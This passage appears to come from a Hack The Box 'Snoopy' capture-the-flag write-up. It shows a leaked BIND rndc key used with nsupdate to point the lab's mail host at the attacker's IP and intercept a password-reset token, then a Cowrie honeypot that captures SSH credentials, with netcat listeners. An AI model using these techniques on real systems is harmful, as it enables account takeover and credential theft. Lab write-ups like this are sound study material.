+	srcset="/p/hackthebox-snoopy/Images/contact_notice_hu13023503956593255888.png 480w, /p/hackthebox-snoopy/Images/contact_notice_hu16253553718896379995.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="1287"
+		data-flex-basis="3088px"
+	
+></p>
+<p>The mailserver at <code>mail.snoopy.htb</code> is currently offline, which is confirmed by reviewing the zone transfer output.
+Returning back to the <code>mm.snoopy.htb</code> subdomain, we can deduce that registered accounts associated with machine usernames are linked to the offline mailserver. When attempting to reset password for an invalid user, the response is a vague confirmation:</p>
+<p><img src="/p/hackthebox-snoopy/Images/FakeReset.png"
+	width="479"
+	height="195"
+	srcset="/p/hackthebox-snoopy/Images/FakeReset_hu3351362847819460560.png 480w, /p/hackthebox-snoopy/Images/FakeReset_hu17623776578456223971.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="245"
+		data-flex-basis="589px"
+	
+></p>
+<p>However, when trying to reset using a valid account like <code>sbrown</code>, we see a unique error:</p>
+<p><img src="/p/hackthebox-snoopy/Images/RealReset.png"
+	width="435"
+	height="276"
+	srcset="/p/hackthebox-snoopy/Images/RealReset_hu7241900293373753165.png 480w, /p/hackthebox-snoopy/Images/RealReset_hu13262826264298033694.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="157"
+		data-flex-basis="378px"
+	
+></p>
+<p>If we could potentially set the mailserver to our own controlled machine, we might be able to receive these password reset emails. Using the file read vulnerability previously discovered, we can enumerate the DNS bind files:</p>
+<h3 id="enumerating-dns-bind-configurations">Enumerating DNS bind configurations
+</h3><p>Checking /etc/bind/named.conf:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-<span class="o">[</span>~/Documents/Snoopy<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─$ cat press_package/etc/bind/named.conf      
+</span></span><span class="line"><span class="cl">// This is the primary configuration file <span class="k">for</span> the BIND DNS server named.
+</span></span><span class="line"><span class="cl">//
+</span></span><span class="line"><span class="cl">// Please <span class="nb">read</span> /usr/share/doc/bind9/README.Debian.gz <span class="k">for</span> information on the 
+</span></span><span class="line"><span class="cl">// structure of BIND configuration files in Debian, *BEFORE* you customize 
+</span></span><span class="line"><span class="cl">// this configuration file.
+</span></span><span class="line"><span class="cl">//
+</span></span><span class="line"><span class="cl">// If you are just adding zones, please <span class="k">do</span> that in /etc/bind/named.conf.local
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">include <span class="s2">&#34;/etc/bind/named.conf.options&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">include <span class="s2">&#34;/etc/bind/named.conf.local&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">include <span class="s2">&#34;/etc/bind/named.conf.default-zones&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">key <span class="s2">&#34;rndc-key&#34;</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">    algorithm hmac-sha256<span class="p">;</span>
+</span></span><span class="line"><span class="cl">    secret <span class="s2">&#34;BEqUtce80uhu3TOEGJJaMlSx9WT2pkdeCtzBeDykQQA=&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="o">}</span><span class="p">;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Here we can view a rndc-key secret.
+In /etc/bind/named.conf.local:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-<span class="o">[</span>~/Documents/Snoopy<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─$ cat press_package/etc/bind/named.conf.local 
+</span></span><span class="line"><span class="cl">//
+</span></span><span class="line"><span class="cl">// Do any <span class="nb">local</span> configuration here
+</span></span><span class="line"><span class="cl">//
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">// Consider adding the <span class="m">1918</span> zones here, <span class="k">if</span> they are not used in your
+</span></span><span class="line"><span class="cl">// organization
+</span></span><span class="line"><span class="cl">//include <span class="s2">&#34;/etc/bind/zones.rfc1918&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">zone <span class="s2">&#34;snoopy.htb&#34;</span> IN <span class="o">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">type</span> master<span class="p">;</span>
+</span></span><span class="line"><span class="cl">    file <span class="s2">&#34;/var/lib/bind/db.snoopy.htb&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    allow-update <span class="o">{</span> key <span class="s2">&#34;rndc-key&#34;</span><span class="p">;</span> <span class="o">}</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    allow-transfer <span class="o">{</span> 10.0.0.0/8<span class="p">;</span> <span class="o">}</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="o">}</span><span class="p">;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>We can see DNS updates are allowed with the rndc-key. So now we should be able to send the DNS an update, telling that the mailserver is associated with our IP address. Then when we reset the password, we will be sent the reset link.</p>
+<h3 id="updating-mailsnoopyhtb">Updating mail.snoopy.htb
+</h3><p>making our key file:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-<span class="o">[</span>~/Documents/Snoopy<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─$ cat key                     
+</span></span><span class="line"><span class="cl">key <span class="s2">&#34;rndc-key&#34;</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">    algorithm hmac-sha256<span class="p">;</span>
+</span></span><span class="line"><span class="cl">    secret <span class="s2">&#34;BEqUtce80uhu3TOEGJJaMlSx9WT2pkdeCtzBeDykQQA=&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="o">}</span><span class="p">;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Using nsupdate to update the mail server:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-<span class="o">[</span>~/Documents/Snoopy<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─$ nsupdate -k key
+</span></span><span class="line"><span class="cl">&gt; server snoopy.htb
+</span></span><span class="line"><span class="cl">&gt; update add mail.snoopy.htb <span class="m">3600</span> IN A 10.10.14.114
+</span></span><span class="line"><span class="cl">&gt; show
+</span></span><span class="line"><span class="cl">Outgoing update query:
+</span></span><span class="line"><span class="cl"><span class="p">;;</span> -&gt;&gt;HEADER<span class="s">&lt;&lt;- opcode: UPDATE, status: NOERROR, id:      0
+</span></span></span><span class="line"><span class="cl"><span class="s">;; flags:; ZONE: 0, PREREQ: 0, UPDATE: 0, ADDITIONAL: 0
+</span></span></span><span class="line"><span class="cl"><span class="s">;; UPDATE SECTION:
+</span></span></span><span class="line"><span class="cl"><span class="s">mail.snoop</span>y.htb.        <span class="m">3600</span>    IN      A       10.10.14.114
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">&gt; send
+</span></span><span class="line"><span class="cl">&gt;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>We can verify the update with nslookup:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-<span class="o">[</span>~/Documents/Snoopy<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─$ nslookup
+</span></span><span class="line"><span class="cl">&gt; server snoopy.htb
+</span></span><span class="line"><span class="cl">Default server: snoopy.htb
+</span></span><span class="line"><span class="cl">Address: 10.10.11.212#53
+</span></span><span class="line"><span class="cl">&gt; mail.snoopy.htb
+</span></span><span class="line"><span class="cl">Server:         snoopy.htb
+</span></span><span class="line"><span class="cl">Address:        10.10.11.212#53
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">** server can<span class="err">&#39;</span>t find mail.snoopy.htb: NXDOMAIN
+</span></span><span class="line"><span class="cl">&gt; mail.snoopy.htb
+</span></span><span class="line"><span class="cl"><span class="p">;;</span> communications error to 10.10.11.212#53: timed out
+</span></span><span class="line"><span class="cl">Server:         snoopy.htb
+</span></span><span class="line"><span class="cl">Address:        10.10.11.212#53
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Name:   mail.snoopy.htb
+</span></span><span class="line"><span class="cl">Address: 10.10.14.114
+</span></span><span class="line"><span class="cl">&gt;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>The first query to <code>mail.snoopy.htb</code> is done before updating, and we see the <code>NXDOMAIN</code> error. However, after sending the nsupdate and querying again, we are shown address 10.10.14.114.</p>
+<h3 id="using-postfix-to-receive-the-password-reset-email">Using Postfix to receive the password reset email
+</h3><p>After updating, we can send a reset email to ourselves successfully. However, just listening on the mail port is insufficient:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-<span class="o">[</span>~/Documents/Snoopy<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─$ nc -nvlp <span class="m">25</span>
+</span></span><span class="line"><span class="cl">listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">25</span> ...
+</span></span><span class="line"><span class="cl">connect to <span class="o">[</span>10.10.14.114<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.11.212<span class="o">]</span> <span class="m">46070</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>There is a connection, but no reset instructions are transmitted. To set up a proper mail receiver, I decided to set up postfix. During installation, I labeled the system mail name as <code>snoopy.htb</code>:</p>
+<p><img src="/p/hackthebox-snoopy/Images/postfix1.png"
+	width="888"
+	height="252"
+	srcset="/p/hackthebox-snoopy/Images/postfix1_hu5912528851000456133.png 480w, /p/hackthebox-snoopy/Images/postfix1_hu17458862937488447743.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="352"
+		data-flex-basis="845px"
+	
+></p>
+<p>After setup, postfix must be launched:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-<span class="o">[</span>~/Documents/Snoopy<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─$ systemctl start postfix
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-<span class="o">[</span>~/Documents/Snoopy<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─$ netstat -ntlp
+</span></span><span class="line"><span class="cl"><span class="o">(</span>Not all processes could be identified, non-owned process info
+</span></span><span class="line"><span class="cl"> will not be shown, you would have to be root to see it all.<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Active Internet connections <span class="o">(</span>only servers<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
+</span></span><span class="line"><span class="cl">tcp        <span class="m">0</span>      <span class="m">0</span> 0.0.0.0:25              0.0.0.0:*               LISTEN      -
+</span></span><span class="line"><span class="cl">tcp6       <span class="m">0</span>      <span class="m">0</span> :::25                   :::*                    LISTEN      -
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>We can see that we are indeed listening on port 25 now. We should be able to properly receive mail sent to our IP address.
+After spending more time troubleshooting, I learn that because the mail is intended for <code>sbrown</code>, my mail server mail is rejecting it, as there is no <code>sbrown</code> user on my system. Adding a sbrown target is a very simple command:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-<span class="o">[</span>~/Documents/Snoopy<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─$ sudo useradd sbrown
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>And now finally, we successfully send a reset email for sbrown:
+<img src="/p/hackthebox-snoopy/Images/RealReset2.png"
+	width="454"
+	height="180"
+	srcset="/p/hackthebox-snoopy/Images/RealReset2_hu6577210460635694496.png 480w, /p/hackthebox-snoopy/Images/RealReset2_hu11604875812263109074.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="252"
+		data-flex-basis="605px"
+	
+></p>
+<p>Looking at our /var/mail, we see a piece for sbrown:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-<span class="o">[</span>~/Documents/Snoopy<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─$ ls -al /var/mail
+</span></span><span class="line"><span class="cl">total <span class="m">32</span>
+</span></span><span class="line"><span class="cl">drwxrwsr-x  <span class="m">2</span> root   mail  <span class="m">4096</span> May <span class="m">08</span> 15:48 .
+</span></span><span class="line"><span class="cl">drwxr-xr-x <span class="m">12</span> root   root  <span class="m">4096</span> Mar <span class="m">23</span> 00:24 ..
+</span></span><span class="line"><span class="cl">-rw-------  <span class="m">1</span> sbrown mail <span class="m">21930</span> May <span class="m">08</span> 15:48 sbrown
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Using sudo to read it&rsquo;s contents:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-<span class="o">[</span>~/Documents/Snoopy<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─$ sudo cat /var/mail/sbrown
+</span></span><span class="line"><span class="cl">From no-reply@snoopy.htb  Mon May <span class="m">08</span> 15:48:03 <span class="m">2023</span>
+</span></span><span class="line"><span class="cl">Return-Path: &lt;no-reply@snoopy.htb&gt;
+</span></span><span class="line"><span class="cl">X-Original-To: sbrown@snoopy.htb
+</span></span><span class="line"><span class="cl">Delivered-To: sbrown@snoopy.htb
+</span></span><span class="line"><span class="cl">Received: from mm.snoopy.htb <span class="o">(</span>snoopy.htb <span class="o">[</span>10.10.11.212<span class="o">])</span>
+</span></span><span class="line"><span class="cl">        by kali <span class="o">(</span>Postfix<span class="o">)</span> with UTF8SMTPS id 90EC23A0429
+</span></span><span class="line"><span class="cl">        <span class="k">for</span> &lt;sbrown@snoopy.htb&gt;<span class="p">;</span> Mon, <span class="m">08</span> May <span class="m">2023</span> 15:48:03 -0400 <span class="o">(</span>EDT<span class="o">)</span>
+</span></span><span class="line"><span class="cl">&lt;...SNIP...&gt;
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">                                        &lt;a <span class="nv">href</span><span class="o">=</span>3D<span class="s2">&#34;http://mm.snoopy.htb/res=
+</span></span></span><span class="line"><span class="cl"><span class="s2">et_password_complete?token=3D5t8ecbojkyd68bgtenyw8uiwfdniycgmsuusxyxt419hbz=
+</span></span></span><span class="line"><span class="cl"><span class="s2">ncc8bocmp9ezw9g4az&#34;</span> <span class="nv">style</span><span class="o">=</span>3D<span class="s2">&#34;display: inline-block; background: #FFFFFF; fo=
+</span></span></span><span class="line"><span class="cl"><span class="s2">nt-family: Open Sans, sans-serif; margin: 0; text-transform: none; mso-padd=
+</span></span></span><span class="line"><span class="cl"><span class="s2">ing-alt: 0px; border-radius: 4px; text-decoration: none; background-color: =
+</span></span></span><span class="line"><span class="cl"><span class="s2">#1C58D9; font-weight: 600; font-size: 16px; line-height: 18px; color: #FFFF=
+</span></span></span><span class="line"><span class="cl"><span class="s2">FF; padding: 15px 24px;&#34;</span> <span class="nv">target</span><span class="o">=</span>3D<span class="s2">&#34;_blank&#34;</span>&gt;
+</span></span><span class="line"><span class="cl">                                          Reset Password
+</span></span><span class="line"><span class="cl">&lt;...SNIP...&gt;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Here we have a link referencing a reset_password and associated token. Each line seems to end with an = and a return, so after trimming the extra contents we are left with this:
+<code>http://mm.snoopy.htb/reset_password_complete?token=5t8ecbojkyd68bgtenyw8uiwfdniycgmsuusxyxt419hbzncc8bocmp9ezw9g4az</code></p>
+<p>Changing the password to <code>Password1</code>, we are shown the reset is successful:</p>
+<p><img src="/p/hackthebox-snoopy/Images/RealReset3.png"
+	width="573"
+	height="462"
+	srcset="/p/hackthebox-snoopy/Images/RealReset3_hu782756782189595149.png 480w, /p/hackthebox-snoopy/Images/RealReset3_hu13011594676919676066.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="124"
+		data-flex-basis="297px"
+	
+></p>
+<p>Now we can authenticate as <code>sbrown</code>!</p>
+<h2 id="foothold">Foothold
+</h2><h3 id="enumerating-mattermost-chat-histories">Enumerating MatterMost chat histories
+</h3><p>Inside the mattermost server, we can see a discussion mentioning a provisioning channel. On the channels tab, we can see the <code>Server Provisioning</code> channel and server_provision command as well.</p>
+<p><img src="/p/hackthebox-snoopy/Images/mm1.png"
+	width="1307"
+	height="371"
+	srcset="/p/hackthebox-snoopy/Images/mm1_hu5498811720270082627.png 480w, /p/hackthebox-snoopy/Images/mm1_hu10943291526702653658.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="352"
+		data-flex-basis="845px"
+	
+></p>
+<p>Moving to the <code>Server Provisioning</code> channel, we can see the interesting custom /server_provision command previously discussed:</p>
+<p><img src="/p/hackthebox-snoopy/Images/mm2.png"
+	width="617"
+	height="345"
+	srcset="/p/hackthebox-snoopy/Images/mm2_hu6923736742695402225.png 480w, /p/hackthebox-snoopy/Images/mm2_hu7841100489945593070.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="178"
+		data-flex-basis="429px"
+	
+></p>
+<p>Executing the command, we are given a small form to request for a new server provision. We are able to submit an IP address of our choosing, and under the Operating System tab we can select Linux - TCP/2222.</p>
+<p><img src="/p/hackthebox-snoopy/Images/mm3.png"
+	width="604"
+	height="576"
+	srcset="/p/hackthebox-snoopy/Images/mm3_hu11873483026786706728.png 480w, /p/hackthebox-snoopy/Images/mm3_hu11612683030859789975.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="104"
+		data-flex-basis="251px"
+	
+></p>
+<p>Before submitting, I set up a listener on port 2222.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-<span class="o">[</span>~/Documents/Snoopy<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─$ nc -nvlp <span class="m">2222</span>
+</span></span><span class="line"><span class="cl">listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">2222</span> ...
+</span></span><span class="line"><span class="cl">connect to <span class="o">[</span>10.10.14.114<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.11.212<span class="o">]</span> <span class="m">57928</span>
+</span></span><span class="line"><span class="cl">SSH-2.0-paramiko_3.1.0
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="using-cowrie-to-establish-an-ssh-honeypot">Using Cowrie to establish an SSH honeypot
+</h3><p>There is an ssh authentication request, but we are not seeing any details from our netcat listener. To better understand the connection attempt, I set up an ssh honeypot with <a class="link" href="https://github.com/cowrie/cowrie"  target="_blank" rel="noopener"
+    >Cowrie</a>.</p>
+<p>First, using docker to install Cowrie:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-<span class="o">[</span>~/Documents/Snoopy<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─$ sudo docker pull cowrie/cowrie
+</span></span><span class="line"><span class="cl">Using default tag: latest
+</span></span><span class="line"><span class="cl">latest: Pulling from cowrie/cowrie
+</span></span><span class="line"><span class="cl">98478ba62ec6: Pulling fs layer
+</span></span><span class="line"><span class="cl">2b776ada0341: Pulling fs layer
+</span></span><span class="line"><span class="cl">&lt;...SNIP...&gt;
+</span></span><span class="line"><span class="cl">4f4fb700ef54: Pull <span class="nb">complete</span>
+</span></span><span class="line"><span class="cl">Digest: sha256:29a316fed1c9743594889adbaeeed5dd3640b00c724f9090844df8a95a70af9c
+</span></span><span class="line"><span class="cl">Status: Downloaded newer image <span class="k">for</span> cowrie/cowrie:latest
+</span></span><span class="line"><span class="cl">docker.io/cowrie/cowrie:latest
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Next, using docker to run on port 2222:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-<span class="o">[</span>~/Documents/Snoopy<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─$ sudo docker run -p 2222:2222 cowrie/cowrie:latest
+</span></span><span class="line"><span class="cl">/&lt;...SNIP...&gt;
+</span></span><span class="line"><span class="cl">2023-05-08T21:14:42+0000 <span class="o">[</span>-<span class="o">]</span> Generating new ed25519 keypair...
+</span></span><span class="line"><span class="cl">2023-05-08T21:14:42+0000 <span class="o">[</span>-<span class="o">]</span> Ready to accept SSH connections
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Finally, resubmit the server provision form. My cowrie server receives a connection attempt, and relays to me what credentials were used:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">2023-05-08T21:14:42+0000 <span class="o">[</span>-<span class="o">]</span> Ready to accept SSH connections
+</span></span><span class="line"><span class="cl">&lt;...SNIP...&gt;
+</span></span><span class="line"><span class="cl">2023-05-08T21:15:49+0000 <span class="o">[</span>cowrie.ssh.transport.HoneyPotSSHTransport#debug<span class="o">]</span> starting service b<span class="s1">&#39;ssh-userauth&#39;</span>
+</span></span><span class="line"><span class="cl">2023-05-08T21:15:49+0000 <span class="o">[</span>cowrie.ssh.userauth.HoneyPotSSHUserAuthServer#debug<span class="o">]</span> b<span class="s1">&#39;cbrown&#39;</span> trying auth b<span class="s1">&#39;password&#39;</span>
+</span></span><span class="line"><span class="cl">2023-05-08T21:15:49+0000 <span class="o">[</span>HoneyPotSSHTransport,0,10.10.11.212<span class="o">]</span> Could not <span class="nb">read</span> etc/userdb.txt, default database activated
+</span></span><span class="line"><span class="cl">2023-05-08T21:15:49+0000 <span class="o">[</span>HoneyPotSSHTransport,0,10.10.11.212<span class="o">]</span> login attempt <span class="o">[</span>b<span class="s1">&#39;cbrown&#39;</span>/b<span class="s1">&#39;sn00pedcr3dential!!!&#39;</span><span class="o">]</span> failed
+</span></span><span class="line"><span class="cl">2023-05-08T21:15:50+0000 <span class="o">[</span>cowrie.ssh.userauth.HoneyPotSSHUserAuthServer#debug<span class="o">]</span> b<span class="s1">&#39;cbrown&#39;</span> failed auth b<span class="s1">&#39;password&#39;</span>
+</span></span><span class="line"><span class="cl">2023-05-08T21:15:50+0000 <span class="o">[</span>cowrie.ssh.userauth.HoneyPotSSHUserAuthServer#debug<span class="o">]</span> unauthorized login: <span class="o">()</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>We now have credentials as <code>cbrown:sn00pedcr3dential!!!</code> and can use this to access the system!</p>
+<h2 id="lateral-movement">Lateral Movement
